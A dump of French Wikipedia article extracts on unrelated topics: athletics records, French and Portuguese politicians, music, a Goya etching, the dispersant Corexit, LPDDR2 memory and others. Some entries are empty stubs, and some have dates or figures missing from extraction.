Les records d'Europe juniors d'athlétisme sont régis par l'Association européenne d'athlétisme (AEA). Ils constituent les meilleures performances européennes des athlètes âgés de moins de vingt ans (U20).
À partir du , World Athletics introduit le nouveau terme « piste courte » (« short track » en anglais) en remplacement du terme « en salle » (« indoor ») pour décrire les compétitions et les performances dont les courses se déroulent sur une piste de 200 m, traditionnellement dans une salle mais également en extérieur.

</doc>
<doc id="7279615" url="https://fr.wikipedia.org/wiki?curid=7279615" title="Record d'Europe junior d'athlétisme">
Record d'Europe junior d'athlétisme



</doc>
<doc id="7279626" url="https://fr.wikipedia.org/wiki?curid=7279626" title="Punaise de la pomme de terre">
Punaise de la pomme de terre



</doc>
<doc id="7279629" url="https://fr.wikipedia.org/wiki?curid=7279629" title="Cheikh Ahmad al-Assir">
Cheikh Ahmad al-Assir



</doc>
<doc id="7279636" url="https://fr.wikipedia.org/wiki?curid=7279636" title="Polyprénol">
Polyprénol

Un polyprénol est un alcool gras isoprénoïde de formule générique , où "n" est supérieur à 4 et représente le nombre d'unités isoprène. Ces composés jouent un rôle physiologique important en tant que biorégulateurs et on les trouve en petite quantité dans un grand nombre de tissus chez les plantes ; les aiguilles de conifères en sont particulièrement riches, tandis que le champignon shiitaké&lt;ref name="10.1016/j.chemphyslip.2004.02.007"&gt;
 &lt;/ref&gt; en présente des traces. Les dolichols, qu'on trouve chez tous les êtres vivants, leur sont apparentés et diffèrent simplement par la saturation de la liaison entre les atomes de carbone 2 et 3&lt;ref name="10.1016/S0021-9673(01)01152-9"&gt;
 &lt;/ref&gt;.
Les polyprénols interviennent dans l'assemblage des récepteurs membranaires impliqués dans la sécrétion de l'insuline, de l'adrénaline, des œstrogènes, de la testostérone et d'autres hormones. Ils facilitent notamment la glycosylation des protéines de la membrane plasmique intervenant dans la signalisation cellulaire et le système immunitaire.

</doc>
<doc id="7279643" url="https://fr.wikipedia.org/wiki?curid=7279643" title="Joseph Bellencontre">
Joseph Bellencontre

Joseph Bellencontre est un homme politique français né le à Guibray (Calvados) et mort le à Paris.
Biographie.
Après une carrière militaire, il prend sa retraite comme colonel d'artillerie. Sous-commissaire du gouvernement à Falaise, en . Il est député du Calvados de 1848 à 1849, siégeant au groupe du général Cavaignac.

</doc>
<doc id="7279646" url="https://fr.wikipedia.org/wiki?curid=7279646" title="DMPP">
DMPP

DMPP, ex Dame Pipi Comix est un fanzine de bande dessinée auto-édité à partir 2004 par Gérald Auclin, alias Dame Pipi. À partir du cinquième numéro, la revue est publiée par The Hoochie Coochie dans un format à l'italienne et associe aux bandes dessinées d'auteurs contemporains un dossier thématique souvent patrimonial. Le premier numéro de cette nouvelle formule a obtenu le Prix de la bande dessinée alternative au festival d'Angoulême 2009. Il n'y a plus eu de parution depuis le (janvier 2015), qui inaugurait une nouvelle formule en grand format.
Histoire.
En 2003, alors qu'il est à l'EESI, Gérald Auclin publie "Abrasive Kleenex", une bande dessinée imprimée sur rouleau de PQ. Il le vend déguisé en Dame Pipi et obtient ainsi ce pseudo.
L'année suivante il publie le premier numéro de "Dame Pipi Comix", trois autres numéros et un hors-série suivront. Il y publie principalement ses travaux mais aussi ceux d'autres auteurs angoumoisins comme Gotpower, 4ndr34s M4rch4l, Pierre Marty, François Henninger, etc. Une attention particulière est apportée à la forme, ainsi le premier numéro voit son sommaire imprimé sur un ticket de caisse, comporte plusieurs papier, crée un jeu avec des languettes. Le , lui, est publié dans une pochette format vinyle, etc. Dès le premier numéro, des planches de Gustave Verbeck sont également publiées.
En , une nouvelle formule voit le jour, "Dame Pipi Comix" devient "DMPP" et Gérald Auclin abandonne son pseudo, le fanzine devient une imposante (170 pages) revue imprimée dans un grand format à l'italienne. Le contenu laisse une place abondante à l'histoire de la bande dessinée et à la critique. En effet, entre les planches de divers jeunes auteurs, on trouve un long dossier sur Gustave Verbeck accompagné de rééditions de bandes méconnues et quelques auteurs contemporains (J&amp;E LeGlatin, Benoît Preteseille, etc.) lui rendent hommage.
Ce numéro cinq obtient le Prix de la bande dessinée alternative (ex-prix fanzine) au festival d'Angoulême 2009.
Par la suite la formule reste la même, le dossier pouvant prendre diverses formes. Ainsi, dans le , il s'agit d'un long entretien avec Matti Hagelberg accompagnés d'histoires inédites, dans le , deux auteurs italiens sont traités, mais le principe général de la revue reste le même.
En , le de "DMPP" est consacré à Lev Youdine, peintre et illustrateur russe, élève puis rival de Kasimir Malevitch. Il s'agit du premier numéro qui n'est pas directement consacré à un auteur de bande dessinée.
Le de inaugure un nouveau ( sur 48 pages, en couleurs), avec un dossier consacré aux bandes dessinées de reportage publiées dans un journal anglais du dirigé par Thierry Smolderen. Le thème du voyage infuse plus largement sur les bandes dessinées du numéro. Il a plus eu d'autre numéro depuis.

</doc>
<doc id="7279649" url="https://fr.wikipedia.org/wiki?curid=7279649" title="Auguste Marie">
Auguste Marie

Auguste Marie est un homme politique français né le à Caen (Calvados) et mort le à Auch (Gers).
Biographie.
Fils d'un banquier, il succède à son père. En , il est commissaire du gouvernement à Caen, et député du Calvados de 1848 à 1849, siégeant à gauche.

</doc>
<doc id="7279652" url="https://fr.wikipedia.org/wiki?curid=7279652" title="Records d'Europe espoirs d'athlétisme">
Records d'Europe espoirs d'athlétisme

Les records d'Europe espoirs d'athlétisme sont régis par l'Association européenne d'athlétisme (AEA). Ils constituent les meilleures performances européennes des athlètes âgés de moins de vingt-trois ans.

</doc>
<doc id="7279654" url="https://fr.wikipedia.org/wiki?curid=7279654" title="Record d'Europe espoir d'athlétisme">
Record d'Europe espoir d'athlétisme



</doc>
<doc id="7279655" url="https://fr.wikipedia.org/wiki?curid=7279655" title="Glenn Flear">
Glenn Flear

Glenn Curtis Flear est un joueur d'échecs anglais né le à Leicester et résidant en France à Montpellier. Grand maître international depuis 1987, il est l'auteur de nombreux livres sur les échecs. Il a participé à un championnat du monde par équipe (médaille de bronze en 1985), à une olympiade d'échecs (médaille d'argent en 1986) et un tournoi interzonal (en 1987).
Biographie et carrière.
Flear obtint le titre de maître international en 1983 et celui de grand maître en 1987. En , il créa une sensation en remportant le très fort tournoi d'échecs de Londres devant Chandler, Short, Nunn, Ribli, Polougaïevski, Portisch, Spassky, Vaganian, Speelman et Larsen. Pendant le même tournoi, il épousa Christine Leroy, championne de France en 1985 sous le nom de Leroy puis quatre fois championne de France sous le nom de Christine Flear dans les années 1990.
En 1986, il était classé mondial avec un classement Elo de points en . La même année, grâce à une deuxième place au tournoi zonal de Bath, il se qualifia pour le tournoi interzonal de Szirák, disputé en 1987, où il finit à la quinzième place sur 18 participants.
Outre le tournoi de Londres en 1986, il a remporté les tournois open de :
Son classement Elo était de en avril 2008.
Compétitions par équipe.
En 1980, Glenn Flear remporta la médaille d'argent par équipe aux olympiades universitaires (championnat du monde des étudiants par équipe) à Mexico. En 1985, il remporta la médaille de bronze par équipe au championnat du monde d'échecs par équipes de Lucerne en Suisse.
Flear participa à l'olympiade d'échecs de 1986 à Dubaï et remporta la médaille d'argent par équipe.
En 2003, il a représenté l'Angleterre au troisième échiquier au championnat d'Europe d'échecs des nations à Plovdiv.
Depuis 2001, Glenn Flear participe chaque année au championnat de Grande-Bretagne par équipe, la Four Nations Chess League (4NCL), compétition qu'il a remporté à onze reprises.
En France, il participe à la première division championnat de France d'échecs des clubs avec le club de Montpellier qui finit troisième en 2008 et quatrième en 2009.

</doc>
<doc id="7279657" url="https://fr.wikipedia.org/wiki?curid=7279657" title="The Wonder Years (album de 9th Wonder)">
The Wonder Years (album de 9th Wonder)

 est le quatrième album studio de 9th Wonder, sorti le .
L'album s'est classé au Top Rap Albums, au Top Independent Albums, au Top R&amp;B/Hip-Hop Albums et 76e au Billboard 200.

</doc>
<doc id="7279661" url="https://fr.wikipedia.org/wiki?curid=7279661" title="Momo e no Tegami">
Momo e no Tegami



</doc>
<doc id="7279663" url="https://fr.wikipedia.org/wiki?curid=7279663" title="Ryszard Zapała">
Ryszard Zapała

Ryszard Zapała, né le à Chęciny, non loin de Kielce (voïvodie de Sainte-Croix), mort dans la même ville le , est un ancien coureur cycliste polonais.
Biographie.
Ryszard Zapała appartient successivement aux clubs "Lechia Kielce" (1955-1957), "Piast Chęciny" (1958-1960 et 1963-1967), "Flota Gdynia" (1961-1962), "SHL Kielce" (1968-1969). Il est membre de l'équipe de Pologne aux championnats du monde en 1963, en prenant la dans l'épreuve individuelle avec un départ de masse. En 1963, il est lauréat du Mémorial W. Skopenki et participe au Tour de Pologne, où il remporte une étape et porte le maillot de leader pendant une journée. 
En 1964, il termine au classement individuel de la Course de la Paix. 
En 1963 et en 1964, il est proclamé meilleur sportif de l'année par le journal "Słowa Ludu". 

</doc>
<doc id="7279667" url="https://fr.wikipedia.org/wiki?curid=7279667" title="Ain't No Stoppin' Us Now">
Ain't No Stoppin' Us Now

 est une chanson interprétée par le duo McFadden &amp; Whitehead pour leur premier album "McFadden &amp; Whitehead" (1979). La ligne de basse est interprétée par Jimmy Williams. Ce single a atteint la place du Hot R&amp;B/Hip-Hop Songs le .
Le thème de la chanson est sur la réussite malgré les adversités. Cela a trouvé un écho notable dans la communauté afro-américaine.
Luther Vandross ou The Rippingtons ont notamment repris cette chanson, tandis que le duo a revisité leur propre chanson en 1984 sous le titre "Ain't No Stoppin' (Ain't No Way)". La ligne de basse a été reprise dans "Ma quale idea" (1980) de Pino D'Angiò et apparaît dans la bande originale de "Boogie Nights" (1997).

</doc>
<doc id="7279669" url="https://fr.wikipedia.org/wiki?curid=7279669" title="Décembre 1954">
Décembre 1954



</doc>
<doc id="7279670" url="https://fr.wikipedia.org/wiki?curid=7279670" title="McFadden &amp; Whitehead">
McFadden &amp; Whitehead

McFadden (28 janvier 1949 – 27 janvier 2006) &amp; Whitehead (10 juillet 1948 – 11 mai 2004) est un duo américain de chanteurs, producteurs et compositeurs, mieux connu du grand public pour la chanson "Ain't No Stoppin' Us Now" (1979). Gene McFadden et John Whitehead ont écrit et produit plusieurs tubes R&amp;B dans les années 1970 et ont été principalement associés au label discographique Philadelphia International Records.

</doc>
<doc id="7279683" url="https://fr.wikipedia.org/wiki?curid=7279683" title="The Wild Bunch (groupe)">
The Wild Bunch (groupe)

The Wild Bunch est un sound system et collectif musical de Bristol. Actif entre 1983 et 1986, il est connu pour avoir été composé des futurs membres de Massive Attack (Robert Del Naja, Grant Marshall et Andrew Vowles), Tricky et Nellee Hooper.

</doc>
<doc id="7279684" url="https://fr.wikipedia.org/wiki?curid=7279684" title="Bonne Pratique Clinique">
Bonne Pratique Clinique



</doc>
<doc id="7279690" url="https://fr.wikipedia.org/wiki?curid=7279690" title="Novembre 1954">
Novembre 1954



</doc>
<doc id="7279699" url="https://fr.wikipedia.org/wiki?curid=7279699" title="George Square (Glasgow)">
George Square (Glasgow)

George Square est une place publique de Glasgow en Écosse. Située dans le centre de la ville, elle est nommée d'après le roi George III.
Les bâtiments notables sur la place incluent les Glasgow City Chambers, l'ancien poste de la ville, qui devint les offices en 2007, et l'office de tourisme de Glasgow.
Il y a de nombreuses statues sur la place. Les statues sont :
Aussi se trouve sur la place le monument de guerre de Glasgow.

</doc>
<doc id="7279700" url="https://fr.wikipedia.org/wiki?curid=7279700" title="Animal d'élevage">
Animal d'élevage



</doc>
<doc id="7279702" url="https://fr.wikipedia.org/wiki?curid=7279702" title="Cala Millor">
Cala Millor

Le Cala Millor (autrefois Cala Milló) est un brick-goélette espagnol servant à la croisière, essentiellement en mer Méditerranée. Il peut embarquer 20 personnes.
Histoire.
Il est construit comme "pailebot" (goélette typique d'Espagne) en 1946 sur le chantier naval Astilleros Naviera Mallorquina à Palma de Majorque, aux îles Baléares. Il est lancé sous le nom de "Cala Milló" et fait du cabotage d'agrumes entre les Baléares, la côte est espagnole et Marseille.
En 1965 il est vendu à une compagnie maritime d'Ibiza et prend le nom d’"Antonio Matutes". Il sert au transport des matériaux de construction pour le développement de l'île. Dès 1970 les derniers pailebots sont désarmés.
En 1973, il est racheté par l'armateur Van Rijmenant. Il subit une restauration, notamment des aménagements intérieurs (cabines, carré et cuisine). Il devient un voilier de croisière sous le nom d’"Outlaw". En 1977 il est cédé à une association allemande de réinsertion, Jugendschiff Corsar de Cuxhaven, et est transformé en brick-goélette. En 1989, il est cédé à une autre association, Drogenhilfe Bremen de Brême, et prend le nom de "Jola". En mauvais état, il reste à quai et sert d'auberge flottante sur la Weser.
En 1996 il est racheté par la compagnie espagnole Circum Navigaciones et reprend son nom d'origine. Après une nouvelle restauration complète, il navigue de nouveau en Méditerranée dès 2004 et prend le nom de "Cala Millor" en 2007. 
Il participe aux Tall Ships' Races et fut présent au départ de la Mediterranean Tall Ships Regatta 2007 et à l'escale de Toulon Voiles de Légende 2007. Il participa à Brest 2008.

</doc>
<doc id="7279713" url="https://fr.wikipedia.org/wiki?curid=7279713" title="Plastic Dreams">
Plastic Dreams

 est un morceau de musique instrumentale de Jaydee sorti en tant que single en 1992 en Belgique et en 1993 au Royaume-Uni sur le label R&amp;S Records. Premier single de l'artiste, il reste généralement considéré comme l'un des classiques de la house music.
Le single atteint la place du Hot Dance Club Songs le . Des versions remixées sortent en 1997 et 2003.

</doc>
<doc id="7279721" url="https://fr.wikipedia.org/wiki?curid=7279721" title="Drapeaux de prière">
Drapeaux de prière



</doc>
<doc id="7279724" url="https://fr.wikipedia.org/wiki?curid=7279724" title="Demi-vie biologique">
Demi-vie biologique



</doc>
<doc id="7279727" url="https://fr.wikipedia.org/wiki?curid=7279727" title="Régiment de chars de combat">
Régiment de chars de combat

Un régiment de chars de combat (RCC) est une unité blindée de l'Armée de terre française. Ce type d'unité est créé dans l'entre-deux-guerres à partir des régiments d'artillerie spéciale de la Grande Guerre. Rattachés à l'origine à l'arme de l'infanterie, les RCC rejoignent en 1942 l'Arme blindée et cavalerie, créée par fusion des chars avec la Cavalerie.
Historique de l'arme blindée française.
Première Guerre mondiale : l' « Artillerie spéciale ».
En mai 1918, les bataillons de chars légers de l'artillerie d'assaut (ou artillerie spéciale), équipés de chars Renault FT, sont regroupés en régiments, les régiments d'artillerie d'assaut, dits RAS (régiments d'artillerie spéciale).
Passage de l'artillerie à l'infanterie.
Un décret du rattache les chars à l'infanterie et les RAS deviennent des RCC.
Ils sont dissous à la mobilisation de 1939 et forment des bataillons de chars de combat (BCC), indépendants.
L'Arme blindée et cavalerie.
Fin 1942, les chars de combat et la cavalerie fusionnent pour former l'arme blindée et cavalerie. Le de chars de combat est recréé en 1943 à partir des compagnies de chars de combat des Forces françaises libres. Il est organisé comme les autres régiments de cavalerie blindée de la blindé.
D'autres régiments de chars de combat sont remis sur pied après la libération de la France.

</doc>
<doc id="7279730" url="https://fr.wikipedia.org/wiki?curid=7279730" title="Septembre 1954">
Septembre 1954



</doc>
<doc id="7279731" url="https://fr.wikipedia.org/wiki?curid=7279731" title="Arrakis Planitia">
Arrakis Planitia

Arrakis Planitia est une planitia sur Titan, la plus grande lune de la planète Saturne. Elle est située dans l'hémisphère sud de Titan, entre 74-80° sud et 113-134° Est, dans la région Mezzoramia.
Arrakis Planitia est nommée d'après Arrakis, une planète désertique fictive qui apparaît dans les romans du cycle de "Dune" de Frank Herbert. Le nom fait suite à une convention qui font que les plaines de Titan sont nommées d'après des planètes de l'œuvre de Herbert.

</doc>
<doc id="7279734" url="https://fr.wikipedia.org/wiki?curid=7279734" title="Charles Mallet">
Charles Mallet

Charles Mallet ( à Jouy-en-Josas - à Paris) est un banquier français.
Biographie.
Fils du banquier Jules Mallet et d'Émilie Oberkampf, il entre dans la banque familiale comme associé, puis comme chef de la Banque Mallet frères.
Cofondateur avec les frères Pereire du Crédit mobilier en 1852, il prend part à la création de la Compagnie générale transatlantique.
Entré au conseil d'administration de la Compagnie de chemins de fer PLM, Mallet en est vice-président (1872) puis président (1879-1891).
Il participe à la création du Crédit agricole et en devient administrateur.
Cofondateur de la Banque impériale ottomane, il en assure la présidence du comité français de 1863 à 1902, aux côtés de William Clay, puis de A. H. Layard, entre autres présidents du comité britannique.
Mallet est aussi président de la Société des chemins de fer autrichiens.

</doc>
<doc id="7279735" url="https://fr.wikipedia.org/wiki?curid=7279735" title="Oratoire San Crescentino">
Oratoire San Crescentino

L′oratoire Saint-Crescentien est un édifice religieux situé à Morra, "frazione" de Città di Castello en Ombrie.
Localisation.
L'oratoire est situé à Morra, "frazione" située à environ de Città di Castello, sur la route menant à Cortone.
Histoire.
L'oratoire a été édifié en 1420 et agrandi en 1507. Deux inscriptions sur la façade indiquent 1420 comme date à laquelle « fut fait un petit oratoire », et en 1507, celle pendant laquelle « il fut reconstruit et agrandi ».
Il est dédié au soldat romain Crescentien qui propageait la foi chrétienne dans la haute vallée du Tibre, et qui fut martyr en 303 sur ordre de Dioclétien.
Description.
Extérieur.
Le corps principal, complété latéralement par un fronton campanaire, présente un toit à double pente et une façade à fronton triangulaire sur laquelle s'ouvre un grand porche, surmonté d'un tympan décoré en 1600 ; y ont été ouvertes ensuite deux petites fenêtres latérales et une grande ouverture qui empiète sur la base du fronton.
Intérieur.
L’intérieur de l'édifice comporte une seule nef de forme rectangulaire, couverte par une toiture charpentée , décorée à fresque par Luca Signorelli et son école et se terminant au fond par une niche en pierre finement sculptée et décorée à fresque. Dans la sacristie de l'oratoire se trouvent des fresques de style gothique tardif d'un maître anonyme local ().
 
Œuvres.
La sacristie actuelle qui occupe l'espace de l'oratoire original du comporte des traces de fresque du gothique tardif attribués à un peintre anonyme local d'inspiration sienno-arétine.
Une décoration a été réalisée entre 1500 et 1510 le long des parois par des peintres de l'école de Luca Signorelli (1450-1523).
Les scènes de "La Flagellation", de "La Crucifixion" et de la "Madone de Lorette" ont été attribuées à Luca Signorelli, bien qu’une restauration récente attribue l’œuvre à son école à partir de cartons conservés au Louvre et au British Museum. Il existe un dessin préparatoire pour le Christ de la "Flagellation", conservé aux Offices à Florence, et un pour un "Flagellateur" au musée du Louvre.
Pour la fresque de "la Madone de Lorette" l’école de Signorelli reprend les codes gothico-byzantins du , l'adaptant aux canons du .
La restauration.
Au cours des années 1970, l'Oratoire fut fortement dégradé par des infiltrations d'eau provenant du toit.
L'intervention nécessaire a été sponsorisée par l'artiste local Alberto Burri qui a offert son prix "premio per la Grafica", reçu de l’Accademia dei Lincei, et par le fruit de la vente d'une de ses œuvres à la Cassa di Risparmio.
Les travaux dirigés par l'architecte Giorgio Giorni, la restauration des fresques de Signorelli et de ses élèves, furent réalisés par Alvaro et Nemo Sarteanesi.
En , l'inauguration de l'oratoire et de ses œuvres a vu la tenue d'un concert de musique pour violon de Jean-Sébastien Bach, joué par le soliste hongrois Sándor Végh.

</doc>
<doc id="7279742" url="https://fr.wikipedia.org/wiki?curid=7279742" title="El de la Rollona">
El de la Rollona

L'eau-forte El de la Rollona ("Le vieil enfant gâté") est une gravure de la série "Los caprichos" du peintre espagnol Francisco de Goya. Elle porte le numéro quatre dans la série des 80 gravures. Elle a été publiée en 1799.
Interprétations de la gravure.
Il existe divers manuscrits contemporains qui expliquent les planches des Caprichos. Celui qui se trouve au Musée du Prado est considéré comme un autographe de Goya, mais semble plutôt chercher à dissimuler et à trouver un sens moralisateur qui masque le sens plus risqué pour l'auteur. Deux autres, celui qui appartient à Ayala et celui qui se trouve à la Bibliothèque nationale, soulignent la signification plus décapante des planches.
Faliu-Lacourt signale que le "Niño de la Rollona", est un motif folklorique qui apparaît au théâtre brièvement au et au début du . Elle note que le "Tesoro de la lengua castellana o española" (1610) de Sebastián de Covarrubias donne le dicton suivant : « l'enfant de la Rollona qui avait sept ans et tétait », et ajoute : "il y a des enfants si chouchoutés, que même grands, ils ne savent pas se détacher du sein de leurs mères; ces grands deviennent stupides ou des coquins vicieux". Le "Diccionario de Autoridades" donne : "Niño de la Rollona": "expression familière qui désigne celui qui malgré son âge, a des attitudes et des mœurs d'enfant". L'avidité et la gourmandise sont des caractéristiques de ce personnage dans les textes de théâtre. Dans la pièce " Mojiganga de los Niños de la Rollona y lo que pasa en las calles" du apparaît l'enfant, couvert de breloques (ornements que les enfants mettent au cou ou à la taille) et d'un bonnet ridicule. Dans d'autres œuvres apparaît l'enfant avec un youpala et à qui on dit : « Va, garçon, va, que Dieu te le commande »; il semble que la difficulté à marcher provoquait des peurs et des superstitions qui faisaient penser que l'enfant avait le mauvais œil.
Faliu-Lacourt note également que Moratín a remarqué la présence d'un « enfant de la Rollona » dans la comédie de , "No hay con la patria venganza y Temístocles en Persia".
Par conséquent, peut-être que par son ami Moratín, Goya était au courant de ce personnage classique du théâtre des siècles précédents. Les caractéristiques décrites par Faliu-Lacourt sont toutes présentes dans l'image: retard mental, les amulettes et le chapeau ridicule, difficulté à marcher (le serviteur le tire dans un youpala) et la superstition que le retard est dû au mauvais œil et justifie le port des amulettes suspendues à la taille.
Selon Helman, ici, Goya critique l'éducation défectueuse des enfants nobles comme royaux, avec le peu d'intérêt que les familles portaient à leur éducation, en traitant ces enfants comme des bébés lorsque leur âge aurait été celui d'occupations sérieuses. Les espagnols partisans des Lumières voyaient dans cette éducation irresponsable la principale cause du déclin de la classe qui aurait dû servir de modèle aux autres. Dans ce sens, l'explication du manuscrit de la Bibliothèque nationale est le plus explicite.
Technique de la gravure.
Le dessin préparatoire à la sanguine, conservé au Musée du Prado, a été en grande partie reproduit dans la gravure. La principale modification est que dans le dessin la figure au second plan tire un charriot à quatre roues et dans la gravure, ce charriot a été remplacé par un chaudron ou un panier avec des anses. À remarquer que du ceinturon du "niño crecido" pendent une clochette, une patte de blaireau (utilisée en guise d'amulette pour se protéger contre les sorcières) et le livre des Évangiles, de même que dans les portraits d'enfance de Philippe III, de deux siècles antérieurs à la gravure. Le dessin préparatoire mesure ( avec le support). Dans le coin inférieur gauche, au crayon est écrit 69.
La position des bras si artificiellement représentée l'est ainsi pour donner une plus grande impression de retard et débilité mentale. Contribue à caractériser ce petit enfant ce bonnet orné et ces amulettes qui sont accrochées à sa ceinture.
L'estampe mesure sur une feuille de papier de . Goya a utilisé l'eau-forte et l'aquatinte.
Dans la gravure, ce petit enfant prend tout son sens avec en contrepoint l'homme au fond. En remplaçant dans le dessin préparatoire le charriot par un chaudron, l'homme accablé traîne maintenant par de grandes courroies non une voiture, mais (ainsi déformé) le symbole de l'ignorance et de la superstition. L'interprétation est claire, le peuple traîne et entretient ce noble idiot.
La planche est conservée dans un mauvais état avec les morsure d'eau-forte et d'aquatinte très abimées.

</doc>
<doc id="7279743" url="https://fr.wikipedia.org/wiki?curid=7279743" title="Août 1954">
Août 1954



</doc>
<doc id="7279752" url="https://fr.wikipedia.org/wiki?curid=7279752" title="Corexit">
Corexit

Corexit, souvent stylisé COREXIT, est le nom d'une gamme de produits dispersants d'hydrocarbures utilisés pour dissoudre les marées noires.
Elle est produite par la Nalco Holding Company, qui a fusionné avec Ecolab en 2011, et est associée à BP et Exxon. Le pétrole, qui devrait normalement remonter à la surface de l'eau, est émulsionné en de minuscules gouttelettes par le dispersant et reste en suspension dans l'eau et sur le plancher océanique.
"Corexit" a été utilisé en grande quantité à la suite de l'explosion de Deepwater Horizon en 2010 dans le golfe du Mexique. En 2012, une étude a révélé que le "Corexit" augmente la toxicité du pétrole de 52 fois.
COREXIT Environmental Solutions a annoncé en novembre 2022 l'arrêt de la fabrication et de la vente de produits de dispersion d'huile et de nettoyage du rivage avec effet immédiat.

</doc>
<doc id="7279775" url="https://fr.wikipedia.org/wiki?curid=7279775" title="Luna Voce">
Luna Voce

Luna Voce, de son vrai nom , née le à Amsterdam, est un mannequin et italienne.
Biographie.
Elle est nommée Top Model of the World en 2011.
En , , pour participer à l'élection de Miss Univers 2013 qui aura lieu à Moscou le .

</doc>
<doc id="7279780" url="https://fr.wikipedia.org/wiki?curid=7279780" title="LPDDR2">
LPDDR2

La LPDDR2 (pour l'anglais : « Low Power Double Data Rate 2 », littéralement, « Débit de données double à basse énergie 2 ») est la deuxième génération de type de mémoire dynamique orienté vers les appareils mobiles à très faible consommation (LPDDR). Elle est principalement utilisée dans les smartphones, les tablettes, et le matériel embarqué.
Un nouveau standard JEDEC définit une révision plus profonde de l'interface DDR basse consommation. Elle n'est pas compatible avec les formats DDR1 et DDR2, mais peut désigner soit :
Les états "basse consommation" sont similaires à ceux de la LPDDR, avec plusieurs options additionnelles de rafraîchissement partiel de la table mémoire.
Les paramètres de temps sont spécifiés de LPDDR-200 à LPDDR-1066 (fréquences d'horloge de 100 à ).
Lorsqu'elle fonctionne à , la LPDDR2 multiplexe les lignes de contrôle et d'adressage sur un bus CA DDR 10-bits. Les commandes sont similaires à celles des SDRAM plus classiques, à l'exception des opcodes de réassignement de la précharge et de la fin accélérée (burst terminate) :
Le bit C0 d'adressage de colonne n'est jamais transféré et est considéré à zéro. Les transferts accélérés commencent ainsi toujours à une adresse paire.
LPDDR2 a également une sélection de puce active-basse (Lorsqu'élevé, tout est en mode NOP) et le signal CKE d'activation d'horloge, qui opère comme la SDRAM. Les commandes envoyées lors d'un cycle, lorsque le signal CKE est émis pour la première fois, sélectionnent l'état arrêt du courant, comme dans le cas de la SDRAM également :
Les registres de mode ont été beaucoup plus étendus que dans la SDRAM conventionnelle, avec un espace d'adressage 8 bits, et la possibilité de les relire. Bien que plus petit qu'une EEPROM de Serial Presence Detect (SPD), suffisamment d'informations sont incluses pour ne pas en nécessiter l'ajout d'une.
Les périphériques S2 plus petits que 4 Gbit et les périphériques S4 plus petits qu'un Gbit n'ont que 4 banques. Ils ignorent le signal BA2, et ne supportent pas le rafraîchissement par banque.
Les périphériques à mémoire non-volatile n'utilisent pas les commandes de rafraîchissement et réassignent la commande de précharge vers les bits de transfert d'adresse A20 et supérieurs. les bits d'ordre bas (A19 et inférieurs) sont transférés par une commande activer qui suit. Cela transfère la rangée sélectionnée de la table mémoire vers l'un des 4 ou 8 (sélectionné par les bits BA) rangées de tampon de données, où elles peuvent être lues par une commande de lecture. Contrairement à la DRAM, les bits d'adressage de banque ne font pas partie de l'adressage de la mémoire ; n'importe quelle adresse peut être transférée vers n'importe quelle rangée du tampon de données. Une rangée de tampon de données peut aller de 32 à de long, en fonction du type de mémoire. Les rangées plus larges que ignorent quelques-uns des bits d'adressage d'ordre bas dans les commandes d'activation. Les rangées plus petites que ignorent quelques-uns des bits d'adressage d'ordre haut de la commande de lecture.
La mémoire non volatile ne supporte pas la commande d'écriture vers les rangées de tampon de données. À la place, une série de registres de contrôle dans une aire d'adressage spéciale acceptent les commandes de lecture et d'écriture, qui peuvent être utilisées pour effacer ou bien programmer la table mémoire.

</doc>
<doc id="7279782" url="https://fr.wikipedia.org/wiki?curid=7279782" title="Patte (fixation)">
Patte (fixation)

Une patte de fixation est un système de fixation mécanique constitué d'une bande métallique que l'on fixe aux parties à assembler au moyen de clous, de vis.
Typologie.
Fin , en termes de serrurerie, une patte désigne un petit morceau de fer peu large et peu épais, qui sert à tenir en place les lambris, les cloisons, les bâtis de portes et autres, les chambranles, les dormants de fenêtres, les dalles - L'usage auquel ces pattes sont destinées leur fait donner plusieurs formes et diverses dénominations, comme patte à pointe, droite ou coudée; à scellement, droite, coudée ou à T; à vis, droite ou coudée, avec ou sans scellement d'un bout et avec un filet de l'autre.
Fin , en termes de marbrerie, une patte désigne une bande de fer mince, portant d'un bout un petit talon rond et coudé, et de l'autre un scellement, et qui sert à arrêter en place la pierre sur laquelle sont montés les marbres d'un chambranle - On s'en sert aussi pour arrêter d'autres parties de marbrerie.

</doc>
<doc id="7279784" url="https://fr.wikipedia.org/wiki?curid=7279784" title="Wlach">
Wlach



</doc>
<doc id="7279791" url="https://fr.wikipedia.org/wiki?curid=7279791" title="Walch">
Walch



</doc>
<doc id="7279793" url="https://fr.wikipedia.org/wiki?curid=7279793" title="Geiselgasteig">
Geiselgasteig



</doc>
<doc id="7279797" url="https://fr.wikipedia.org/wiki?curid=7279797" title="Vlah">
Vlah



</doc>
<doc id="7279798" url="https://fr.wikipedia.org/wiki?curid=7279798" title="Teresa Patrício Gouveia">
Teresa Patrício Gouveia

Maria Teresa Pinto Basto Patrício de Gouveia, née le à Lisbonne, est une femme politique portugaise, membre du Parti social-démocrate (PPD/PSD).
Biographie.
Formation et vie professionnelle.
Elle est titulaire d'une licence d'histoire, obtenue à la faculté des lettres de l'université de Lisbonne. Elle a ensuite travaillé comme bibliothécaire, puis a rejoint le secrétariat d'État à la Culture, où elle a notamment dirigé le cabinet des relations culturelles internationales.
Débuts en politique.
En 1985, elle est nommée secrétaire d'État à la Culture auprès de João de Deus Pinheiro, ministre de l'Éducation et de la Culture du premier gouvernement d'Aníbal Cavaco Silva. Élue députée aux élections anticipées deux ans plus tard, elle est reconduite dans ses fonctions, cette fois-ci auprès du Premier ministre. Pedro Santana Lopes lui succède le .
Ministre de l'Environnement.
Après les législatives de 1991, elle devient secrétaire d'État adjointe du ministre de l'Environnement, Carlos Borrego, dans le troisième gouvernement de Cavaco Silva.
Le , Teresa Patrício Gouveia est choisie comme nouvelle ministre de l'Environnement et des Ressources naturelles, un poste qu'elle occupe jusqu'à la fin de la législature, en .
Passage dans l'opposition.
À peine quatre mois plus tard, en , elle est élue à la commission politique nationale du PPD/PSD, sous la présidence de Marcelo Rebelo de Sousa. Elle est reconduite en , mais quitte finalement la direction du parti, lorsque José Manuel Durão Barroso en prend la tête, en .
Chef de la diplomatie.
Le PPD/PSD revient au pouvoir en . Membre de la commission des Affaires étrangères et de la commission de la Défense à l'Assemblée de la République, elle est nommée ministre des Affaires étrangères le , dans le gouvernement de Barroso, en remplacement d'António Martins da Cruz. Lorsque Pedro Santana Lopes devient Premier ministre, en , elle n'est pas reconduite dans ses fonctions.
Retrait de la politique.
Elle décide alors de ne pas reprendre son mandat de députée et se retire de la vie politique. Elle travaille désormais pour diverses fondations.

</doc>
<doc id="7279799" url="https://fr.wikipedia.org/wiki?curid=7279799" title="Oenothera glazioviana">
Oenothera glazioviana

